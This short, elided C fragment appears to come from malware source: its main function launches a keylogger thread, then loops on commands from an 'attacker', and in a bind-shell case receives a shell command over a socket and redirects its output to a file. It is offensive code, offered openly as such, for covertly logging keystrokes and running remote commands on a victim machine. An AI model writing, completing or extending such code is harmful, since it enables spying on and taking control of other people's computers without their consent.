...
int main (){
	...
	pthread_create(&keyloger_log_thread, NULL, start_keylogger_log, NULL); 
	...
	while (true){
		...
		switch (attacker_income_action){
			...
			case SEND_BIND_SHELL_COMMAND :
				recv(V_S_socket, bind_shell_command, MAX_BIND_SHELL_COMMAND * sizeof(char), 0);
				strcat(bind_shell_command," > shell_command_output.txt"); // set the shell_command_output to spasipic path!! !!!1
